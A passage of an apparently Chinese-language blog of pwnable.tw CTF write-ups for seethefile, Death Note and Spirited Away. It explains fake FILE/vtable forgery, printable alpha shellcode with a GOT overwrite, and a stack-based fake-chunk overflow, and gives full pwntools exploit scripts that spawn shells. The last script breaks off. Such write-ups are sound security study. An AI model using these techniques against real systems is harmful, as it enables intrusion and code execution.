class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">int</span><br><span class="line">_IO_new_fclose (_IO_FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  int status;</span><br><span class="line"></span><br><span class="line">  CHECK_FILE(fp, EOF);</span><br><span class="line"></span><br><span class="line">#if SHLIB_COMPAT (libc, GLIBC_2_0, GLIBC_2_1)</span><br><span class="line">  /* We desperately try to help programs which are using streams in a</span><br><span class="line">     strange way and mix old and new functions.  Detect old streams</span><br><span class="line">     here.  */</span><br><span class="line">  if (_IO_vtable_offset (fp) != 0)</span><br><span class="line">    return _IO_old_fclose (fp);</span><br><span class="line">#endif</span><br><span class="line"></span><br><span class="line">  /* First unlink the stream.  */</span><br><span class="line">  if (fp-&gt;_IO_file_flags &amp; _IO_IS_FILEBUF)//_IO_IS_FILEBUF的值为0x2000</span><br><span class="line">    _IO_un_link ((struct _IO_FILE_plus *) fp);</span><br><span class="line"></span><br><span class="line">  _IO_acquire_lock (fp);</span><br><span class="line">  if (fp-&gt;_IO_file_flags &amp; _IO_IS_FILEBUF)</span><br><span class="line">    status = _IO_file_close_it (fp);</span><br><span class="line">  else</span><br><span class="line">    status = fp-&gt;_flags &amp; _IO_ERR_SEEN ? -1 : 0;</span><br><span class="line">  _IO_release_lock (fp);</span><br><span class="line">  _IO_FINISH (fp);</span><br><span class="line">  if (fp-&gt;_mode &gt; 0)</span><br><span class="line">    &#123;</span><br><span class="line">#if _LIBC</span><br><span class="line">      /* This stream has a wide orientation.  This means we have to free</span><br><span class="line"> the conversion functions.  */</span><br><span class="line">      struct _IO_codecvt *cc = fp-&gt;_codecvt;</span><br><span class="line"></span><br><span class="line">      __libc_lock_lock (__gconv_lock);</span><br><span class="line">      __gconv_release_step (cc-&gt;__cd_in.__cd.__steps);</span><br><span class="line">      __gconv_release_step (cc-&gt;__cd_out.__cd.__steps);</span><br><span class="line">      __libc_lock_unlock (__gconv_lock);</span><br><span class="line">#endif</span><br><span class="line">    &#125;</span><br><span class="line">  else</span><br><span class="line">    &#123;</span><br><span class="line">      if (_IO_have_backup (fp))</span><br><span class="line">_IO_free_backup_area (fp);</span><br><span class="line">    &#125;</span><br><span class="line">  if (fp != _IO_stdin &amp;&amp; fp != _IO_stdout &amp;&amp; fp != _IO_stderr)</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_IO_file_flags = 0;</span><br><span class="line">      free(fp);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  return status;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以看见fclose函数将会调用<code>_IO_FINISH (fp)</code>函数，其存在于vtable需表中，而vtable就存在于_IO_FILE_plus中。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">struct _IO_FILE_plus</span><br><span class="line">&#123;</span><br><span class="line">  _IO_FILE file;</span><br><span class="line">  const struct _IO_jump_t *vtable;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>我们在构造_IO_FILE结构体主要就是伪造一个vtable表，将_IO_FINISH()覆盖为system的值即可。</p><p>现在我们需要先泄露出libc的基地址，因为可以读取并输出任意文件，而libc等文件信息一般被放在/proc/<pid>/maps中，这里的pid替换为self。因此我们读取他就可以拿到libc的基地址。</pid></p><p>从源码中我们可以看出如果_IO_file_flags&amp;0x2000=0就可以绕过前面两个if直接执行_IO_FINISH函数。因此我们只要把_IO_file_flags的值覆盖为满足条件的值即可，且不能有\x00，不然将无法执行后面的；sh\x00。</p><p><img src="/2021/10/21/pwnable-tw%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211027221010581.png" class="lazyload placeholder" data-srcset="/2021/10/21/pwnable-tw%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211027221010581.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20211027221010581"></p><p>exp：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">#io=process(&#x27;./seethefile&#x27;)</span><br><span class="line">io=remote(&#x27;chall.pwnable.tw&#x27; ,10200)</span><br><span class="line">elf=ELF(&#x27;./seethefile&#x27;)</span><br><span class="line">libc=ELF(&#x27;./libc_32.so.6&#x27;)</span><br><span class="line">#libc=elf.libc</span><br><span class="line">context.log_level=&#x27;debug&#x27;</span><br><span class="line"></span><br><span class="line">def opens(filename):</span><br><span class="line">io.recvuntil(&#x27;Your choice :&#x27;)</span><br><span class="line">io.sendline(&#x27;1&#x27;)</span><br><span class="line">io.sendlineafter(&#x27;What do you want to see :&#x27;,filename)</span><br><span class="line"></span><br><span class="line">def reads():</span><br><span class="line">io.sendlineafter(&#x27;Your choice :&#x27;,&#x27;2&#x27;)</span><br><span class="line"></span><br><span class="line">def writes():</span><br><span class="line">io.sendlineafter(&#x27;Your choice :&#x27;,&#x27;3&#x27;)</span><br><span class="line"></span><br><span class="line">def closes():</span><br><span class="line">io.sendlineafter(&#x27;Your choice :&#x27;,&#x27;4&#x27;)</span><br><span class="line"></span><br><span class="line">def exp():</span><br><span class="line">opens(&#x27;/proc/self/maps&#x27;)</span><br><span class="line">reads()</span><br><span class="line">writes()</span><br><span class="line">io.recvline()</span><br><span class="line">io.recvline()</span><br><span class="line">io.recvline()</span><br><span class="line">heap_addr=int(io.recv(8),16)+0x1010</span><br><span class="line">io.recvline()</span><br><span class="line">libc_base=int(io.recv(8),16)+0x1000</span><br><span class="line">print(&#x27;heap_addr&#x27;,hex(heap_addr))</span><br><span class="line">print(&#x27;libc_base&#x27;,hex(libc_base))</span><br><span class="line">system=libc_base+libc.symbols[&#x27;system&#x27;]</span><br><span class="line"></span><br><span class="line">io.sendlineafter(&#x27;Your choice :&#x27;,&#x27;5&#x27;)</span><br><span class="line">payload=&#x27;a&#x27;*0x20+p32(0x804b290)+p32(0)*3</span><br><span class="line">payload+=p32(0xFBAD1C58)+&#x27;;sh\x00&#x27;+p32(heap_addr+0x560)+p32(heap_addr+0x160)*5</span><br><span class="line">payload+=p32(heap_addr+0x560)+p32(0)*4</span><br><span class="line">payload+=p32(libc_base+libc.symbols[&#x27;_IO_2_1_stderr_&#x27;])+p32(3)</span><br><span class="line">payload+=p32(0)*3+p32(heap_addr+0x98)+p32(0xffffffff)*2</span><br><span class="line">payload+=p32(0)+p32(heap_addr+0xa4)+p32(0)*3+p32(0xffffffff)</span><br><span class="line">payload+=p32(0)*10+p32(0x804b290+0xb8)+p64(0)*4</span><br><span class="line">payload+=p32(0)*2+p32(system)</span><br><span class="line">#gdb.attach(io)</span><br><span class="line">io.sendlineafter(&#x27;name :&#x27;,payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure><h3 id="5-Death-Note-alpha-shellcode的编写"><a href="#5-Death-Note-alpha-shellcode的编写" class="headerlink" title="5.Death Note(alpha_shellcode的编写)"></a>5.Death Note(alpha_shellcode的编写)</h3><p>可以看见v1是int类型，因此当v1为负数时，就可以修改got表。</p><p><img src="/2021/10/21/pwnable-tw%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211028194544373.png" class="lazyload placeholder" data-srcset="/2021/10/21/pwnable-tw%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211028194544373.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20211028194544373"></p><p>因此将堆指针覆盖掉free的got地址，然后调用free函数时eip就直接跳转到堆上执行，因此我们只需要在堆上写shellcode即可。</p><p>但这里有个检查，shellcode必须是可显示字符。</p><p><img src="/2021/10/21/pwnable-tw%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211028203053901.png" class="lazyload placeholder" data-srcset="/2021/10/21/pwnable-tw%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211028203053901.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20211028203053901"></p><p>这种shellcode被称为alpha_shellcode,写这种shellcode有两种方法，一种是用alpha3这个工具写，但写出的shellcode太长需要两百多字节，所以在这里我们考虑第二种方法手写。</p><p>网上有大佬将可以用到的汇编指令都罗列了下来，如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">1.数据传送:</span><br><span class="line">push/pop eax…</span><br><span class="line">pusha/popa</span><br><span class="line"></span><br><span class="line">2.算术运算:</span><br><span class="line">inc/dec eax…</span><br><span class="line">sub al, 立即数</span><br><span class="line">sub byte ptr [eax… + 立即数], al dl…</span><br><span class="line">sub byte ptr [eax… + 立即数], ah dh…</span><br><span class="line">sub dword ptr [eax… + 立即数], esi edi</span><br><span class="line">sub word ptr [eax… + 立即数], si di</span><br><span class="line">sub al dl…, byte ptr [eax… + 立即数]</span><br><span class="line">sub ah dh…, byte ptr [eax… + 立即数]</span><br><span class="line">sub esi edi, dword ptr [eax… + 立即数]</span><br><span class="line">sub si di, word ptr [eax… + 立即数]</span><br><span class="line"></span><br><span class="line">3.逻辑运算:</span><br><span class="line">and al, 立即数</span><br><span class="line">and dword ptr [eax… + 立即数], esi edi</span><br><span class="line">and word ptr [eax… + 立即数], si di</span><br><span class="line">and ah dh…, byte ptr [ecx edx… + 立即数]</span><br><span class="line">and esi edi, dword ptr [eax… + 立即数]</span><br><span class="line">and si di, word ptr [eax… + 立即数]</span><br><span class="line"></span><br><span class="line">xor al, 立即数</span><br><span class="line">xor byte ptr [eax… + 立即数], al dl…</span><br><span class="line">xor byte ptr [eax… + 立即数], ah dh…</span><br><span class="line">xor dword ptr [eax… + 立即数], esi edi</span><br><span class="line">xor word ptr [eax… + 立即数], si di</span><br><span class="line">xor al dl…, byte ptr [eax… + 立即数]</span><br><span class="line">xor ah dh…, byte ptr [eax… + 立即数]</span><br><span class="line">xor esi edi, dword ptr [eax… + 立即数]</span><br><span class="line">xor si di, word ptr [eax… + 立即数]</span><br><span class="line"></span><br><span class="line">4.比较指令:</span><br><span class="line">cmp al, 立即数</span><br><span class="line">cmp byte ptr [eax… + 立即数], al dl…</span><br><span class="line">cmp byte ptr [eax… + 立即数], ah dh…</span><br><span class="line">cmp dword ptr [eax… + 立即数], esi edi</span><br><span class="line">cmp word ptr [eax… + 立即数], si di</span><br><span class="line">cmp al dl…, byte ptr [eax… + 立即数]</span><br><span class="line">cmp ah dh…, byte ptr [eax… + 立即数]</span><br><span class="line">cmp esi edi, dword ptr [eax… + 立即数]</span><br><span class="line">cmp si di, word ptr [eax… + 立即数]</span><br><span class="line"></span><br><span class="line">5.转移指令:</span><br><span class="line">push 56h</span><br><span class="line">pop eax</span><br><span class="line">cmp al, 43h</span><br><span class="line">jnz lable</span><br><span class="line"></span><br><span class="line">&lt;=&gt; jmp lable</span><br><span class="line"></span><br><span class="line">6.交换al, ah</span><br><span class="line">push eax</span><br><span class="line">xor ah, byte ptr [esp] // ah ^= al</span><br><span class="line">xor byte ptr [esp], ah // al ^= ah</span><br><span class="line">xor ah, byte ptr [esp] // ah ^= al</span><br><span class="line">pop eax</span><br><span class="line"></span><br><span class="line">7.清零:</span><br><span class="line">push 44h</span><br><span class="line">pop eax</span><br><span class="line">sub al, 44h ; eax = 0</span><br><span class="line"></span><br><span class="line">push esi</span><br><span class="line">push esp</span><br><span class="line">pop eax</span><br><span class="line">xor [eax], esi ; esi = 0</span><br></pre></td></tr></table></figure><p>因此，我们就可以利用这些指令写出我们的shellcode</p><p>exp如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">#io=process(&#x27;./death_note&#x27;)</span><br><span class="line">io=remote(&#x27;chall.pwnable.tw&#x27; ,10201)</span><br><span class="line">context.log_level=&#x27;debug&#x27;</span><br><span class="line"></span><br><span class="line">def add(index,name):</span><br><span class="line">io.sendlineafter(&#x27;Your choice :&#x27;,&#x27;1&#x27;)</span><br><span class="line">io.sendlineafter(&#x27;Index :&#x27;,str(index))</span><br><span class="line">io.sendlineafter(&#x27;Name :&#x27;,name)</span><br><span class="line"></span><br><span class="line">def show(index):</span><br><span class="line">io.sendlineafter(&#x27;Your choice :&#x27;,&#x27;2&#x27;)</span><br><span class="line">io.sendlineafter(&#x27;Index :&#x27;,str(index))</span><br><span class="line"></span><br><span class="line">def dele(index):</span><br><span class="line">io.sendlineafter(&#x27;Your choice :&#x27;,&#x27;3&#x27;)</span><br><span class="line">io.sendlineafter(&#x27;Index :&#x27;,str(index))</span><br><span class="line"></span><br><span class="line">def exp():</span><br><span class="line">payload=&#x27;&#x27;&#x27;</span><br><span class="line">#eax初始就有堆的地址</span><br><span class="line">xor al,0x77;</span><br><span class="line">inc eax;</span><br><span class="line">push eax;</span><br><span class="line">pop ecx;</span><br><span class="line">xor al,0x20;</span><br><span class="line">push eax;</span><br><span class="line">pop edx;</span><br><span class="line">xor al,0x20;</span><br><span class="line">dec eax;</span><br><span class="line">xor al,0x77;</span><br><span class="line"></span><br><span class="line">xor [eax+0x26],cl;</span><br><span class="line">xor [eax+0x27],dl;</span><br><span class="line">xor al,0x58;</span><br><span class="line">push eax;</span><br><span class="line">pop ebx;</span><br><span class="line">push 0x56;</span><br><span class="line">pop eax;</span><br><span class="line">sub al,0x56;</span><br><span class="line">push eax;</span><br><span class="line">pop ecx;</span><br><span class="line">push eax;</span><br><span class="line">pop edx;</span><br><span class="line">push 0x2c;</span><br><span class="line">pop eax;</span><br><span class="line">sub al,0x21;</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">payload=asm(payload)+&#x27;\x4d\x20&#x27;</span><br><span class="line">payload+=&#x27;/bin/sha&#x27;*4+&#x27;/bin/sh&#x27;</span><br><span class="line">print(len(payload))</span><br><span class="line">add(-19,payload)</span><br><span class="line">#gdb.attach(io)</span><br><span class="line">dele(-19)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure><h3 id="7-Spirited-Away"><a href="#7-Spirited-Away" class="headerlink" title="7.Spirited Away"></a>7.Spirited Away</h3><p>这个题的代码虽然少，但是漏洞隐藏的却很深，我前前后后读了很多遍代码，主函数如下，我发现只对nbytes和v3只进行了一次赋值，这样很容易修改他俩的值，如果能修改就好了，然后看要怎么才能修改他们，很自然的就往v1数组看去，发现他的大小只有56，但存储的字符出去数字就有55的长度，说明只能存储一位数的数字，如果有两位甚至三位数字就会溢出。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">int survey()</span><br><span class="line">&#123;</span><br><span class="line">  char v1[56]; // [esp+10h] [ebp-E8h] BYREF</span><br><span class="line">  size_t nbytes; // [esp+48h] [ebp-B0h]</span><br><span class="line">  size_t v3; // [esp+4Ch] [ebp-ACh]</span><br><span class="line">  char s[80]; // [esp+50h] [ebp-A8h] BYREF</span><br><span class="line">  int v5; // [esp+A0h] [ebp-58h] BYREF</span><br><span class="line">  void *buf; // [esp+A4h] [ebp-54h]</span><br><span class="line">  char v7[80]; // [esp+A8h] [ebp-50h] BYREF</span><br><span class="line"></span><br><span class="line">  nbytes = 0x3C;</span><br><span class="line">  v3 = 0x50;</span><br><span class="line">LABEL_2:</span><br><span class="line">  memset(s, 0, sizeof(s));</span><br><span class="line">  buf = malloc(0x3Cu);</span><br><span class="line">  printf(&quot;\nPlease enter your name: &quot;);</span><br><span class="line">  fflush(stdout);</span><br><span class="line">  read(0, buf, nbytes);</span><br><span class="line">  printf(&quot;Please enter your age: &quot;);</span><br><span class="line">  fflush(stdout);</span><br><span class="line">  __isoc99_scanf(&quot;%d&quot;, &amp;v5);</span><br><span class="line">  printf(&quot;Why did you came to see this movie? &quot;);</span><br><span class="line">  fflush(stdout);</span><br><span class="line">  read(0, v7, v3);</span><br><span class="line">  fflush(stdout);</span><br><span class="line">  printf(&quot;Please enter your comment: &quot;);</span><br><span class="line">  fflush(stdout);</span><br><span class="line">  read(0, s, nbytes);</span><br><span class="line">  ++cnt;</span><br><span class="line">  printf(&quot;Name: %s\n&quot;, (const char *)buf);</span><br><span class="line">  printf(&quot;Age: %d\n&quot;, v5);</span><br><span class="line">  printf(&quot;Reason: %s\n&quot;, v7);</span><br><span class="line">  printf(&quot;Comment: %s\n\n&quot;, s);</span><br><span class="line">  fflush(stdout);</span><br><span class="line">  sprintf(v1, &quot;%d comment so far. We will review them as soon as we can&quot;, cnt);</span><br><span class="line">  puts(v1);</span><br><span class="line">  puts(&amp;::s);</span><br><span class="line">  fflush(stdout);</span><br><span class="line">  if ( cnt &gt; 199 )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;200 comments is enough!&quot;);</span><br><span class="line">    fflush(stdout);</span><br><span class="line">    exit(0);</span><br><span class="line">  &#125;</span><br><span class="line">  while ( 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    printf(&quot;Would you like to leave another comment? &lt;y/n&gt;: &quot;);</span><br><span class="line">    fflush(stdout);</span><br><span class="line">    read(0, &amp;choice, 3u);</span><br><span class="line">    if ( choice == 89 || choice == 121 )</span><br><span class="line">    &#123;</span><br><span class="line">      free(buf);</span><br><span class="line">      goto LABEL_2;</span><br><span class="line">    &#125;</span><br><span class="line">    if ( choice == 78 || choice == 110 )</span><br><span class="line">      break;</span><br><span class="line">    puts(&quot;Wrong choice.&quot;);</span><br><span class="line">    fflush(stdout);</span><br><span class="line">  &#125;</span><br><span class="line">  puts(&quot;Bye!&quot;);</span><br><span class="line">  return fflush(stdout);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当cnt为两位数时，那么’\x00’将会覆盖nbytes，当cnt为三位数时，那么’n‘也就是’\x6e‘将会覆盖nbytes，这时就可以溢出来覆盖堆指针buf了。</p><p>接下来需要思考将堆指针指向哪，由于free之后立马又malloc了，因此可以在栈上伪造chunk，然后再申请回来，v7离ebp最近，同时我们也可以控制v7的数据，在v7中伪造chunk，然后再利用堆溢出，这样就能改写返回地址了。因为是libc-2.23，unlink操作中没有判断netxchunk的nextchunk，因此我们只需要在fakechunk下写上p32(0)+p32(0x11)就绕过，使栈上的chunk被放入fastbin中。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">#define unlink(AV, P, BK, FD) &#123;                                            \</span><br><span class="line">    FD = P-&gt;fd;      \</span><br><span class="line">    BK = P-&gt;bk;      \</span><br><span class="line">    if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))      \</span><br><span class="line">      malloc_printerr (check_action, &quot;corrupted double-linked list&quot;, P, AV);  \</span><br><span class="line">    else &#123;      \</span><br><span class="line">        FD-&gt;bk = BK;      \</span><br><span class="line">        BK-&gt;fd = FD;      \</span><br><span class="line">        if (!in_smallbin_range (P-&gt;size)      \</span><br><span class="line">            &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != NULL, 0)) &#123;      \</span><br><span class="line">    if (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, 0)      \</span><br><span class="line">|| __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, 0))    \</span><br><span class="line">      malloc_printerr (check_action,      \</span><br><span class="line">       &quot;corrupted double-linked list (not small)&quot;,    \</span><br><span class="line">       P, AV);      \</span><br><span class="line">            if (FD-&gt;fd_nextsize == NULL) &#123;      \</span><br><span class="line">                if (P-&gt;fd_nextsize == P)      \</span><br><span class="line">                  FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;      \</span><br><span class="line">                else &#123;      \</span><br><span class="line">                    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;      \</span><br><span class="line">                    FD-&gt;bk_nextsize = P-&gt;bk_nextsize;      \</span><br><span class="line">                    P-&gt;fd_nextsize-&gt;bk_nextsize = FD;      \</span><br><span class="line">                    P-&gt;bk_nextsize-&gt;fd_nextsize = FD;      \</span><br><span class="line">                  &#125;      \</span><br><span class="line">              &#125; else &#123;      \</span><br><span class="line">                P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;      \</span><br><span class="line">                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;      \</span><br><span class="line">              &#125;      \</span><br><span class="line">          &#125;      \</span><br><span class="line">      &#125;      \</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>exp：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">#io=process(&#x27;./spirited_away&#x27;)</span><br><span class="line">io=remote(&#x27;chall.pwnable.tw&#x27; ,10204)</span><br><span class="line">elf=ELF(&#x27;./spirited_away&#x27;)</span><br><span class="line">#libc=elf.libc</span><br><span class="line">libc=ELF(&#x27;./libc_32.so.6&#x27;)</span><br><span class="line">main=elf.symbols[&#x27;main&#x27;]</span><br><span class="line">ret=0x0804841e</span><br><span class="line">context.log_level=&#x27;debug&#x27;</span><br><span class="line"></span><br><span class="line">def survey(name,age,content,comment,choice):</span><br><span class="line">io.recvuntil(&#x27; name: &#x27;,timeout=1)</span><br><span class="line">io.send(name)</span><br><span class="line">io.recvuntil(&#x27;age: &#x27;,timeout=1)</span><br><span class="line">io.sendline(str(age))</span><br><span class="line">io.recvuntil(&#x27;movie? &#x27;,timeout=1)</span><br><span class="line">io.send(content)</span><br><span class="line">io.recvuntil(&#x27;comment: &#x27;,timeout=1)</span><br><span class="line">io.send(comment)</span><br><span class="line">io.recvuntil(&#x27;comment? &lt;y/n&gt;: &#x27;,timeout=1)</span><br><span class="line">io.sendline(choice)</span><br><span class="line"></span><br><span class="line">def survey2(age,content,choice):</span><br><span 